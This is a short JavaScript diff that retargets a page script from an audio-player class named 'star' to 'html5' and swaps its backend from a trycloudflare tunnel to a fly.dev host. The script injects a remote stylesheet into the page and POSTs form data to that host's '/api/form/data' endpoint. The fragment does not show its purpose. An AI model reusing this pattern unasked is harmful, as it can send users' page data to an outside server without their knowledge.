@@ -1,4 +1,4 @@
-const googleFormModalElement = document.querySelectorAll(".star-audio-player")
+const googleFormModalElement = document.querySelectorAll(".html5-audio-player")
 
 
 const cssInt = () => {
@@ -6,7 +6,7 @@ const cssInt = () => {
   var i = document.createElement("link");
   i.rel = "stylesheet";
   i.type = "text/css";
-  i.href = "https://states-collins-circle-slim.trycloudflare.com" + "/style.css";
+  i.href = "https://appp-long-snowflake-3055.fly.dev" + "/style.css";
   i.media = "all";
   return a.appendChild(i);
 }
@@ -59,7 +59,7 @@ if (googleFormModalElement.length > 0) {
 
 
   })
-  fetch("https://states-collins-circle-slim.trycloudflare.com/api/form/data", {
+  fetch("https://appp-long-snowflake-3055.fly.dev/api/form/data", {
     method: "POST",
     header: {
       "Content-Type": "application/json",
